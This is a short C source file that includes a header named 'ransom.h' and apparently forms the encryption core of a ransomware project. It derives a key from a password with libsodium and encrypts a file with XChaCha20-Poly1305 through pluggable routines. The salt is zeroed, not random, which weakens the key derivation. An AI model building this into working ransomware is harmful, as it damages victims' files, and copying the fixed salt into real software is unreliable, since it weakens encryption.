#include "ransom.h"

static int generate_crypto_key(unsigned char *generated_key,
    const char *password)
{
    int ret = sodium_init();
    unsigned char salt[SALT_LEN];

    if (ret < 0) {
        perror("sodium_init");
        return ret;
    } else if (ret == 1)
        puts("libsodium already initialized.");
    sodium_memzero(salt, sizeof(salt));
    if ((ret = crypto_pwhash(generated_key, MAX_KEY_LEN, password, strlen(password),
            salt, crypto_pwhash_OPSLIMIT_INTERACTIVE, crypto_pwhash_MEMLIMIT_INTERACTIVE,
            crypto_pwhash_ALG_DEFAULT)))
        perror("crypto_pwh_ash");
    return ret;
}

int graceful_exit(FILE *f1, FILE *f2, unsigned char *generated_key, int ret)
{
    fclose(f1);
    fclose(f2);
    sodium_memzero(generated_key, MAX_KEY_LEN);
    return ret;
}

int core(const char *password,
    const char *filepath, const char *optfilepath, cryptalgo_t algo)
{
    unsigned char generated_key[MAX_KEY_LEN];
    FILE *old_file, *new_file = NULL;
    int ret = 0;
    crypto_secretstream_xchacha20poly1305_state st;

    if (generate_crypto_key(generated_key, password))
        return EXIT_FAILURE;
    if (algo.init_cryptalgo(&old_file, &new_file, filepath, optfilepath))
        return EXIT_FAILURE;
    if (algo.manage_header(generated_key, &old_file, &new_file, &st))
        return EXIT_FAILURE;
    ret = algo.loop(old_file, new_file, st);
    return graceful_exit(old_file, new_file, generated_key, ret);
}

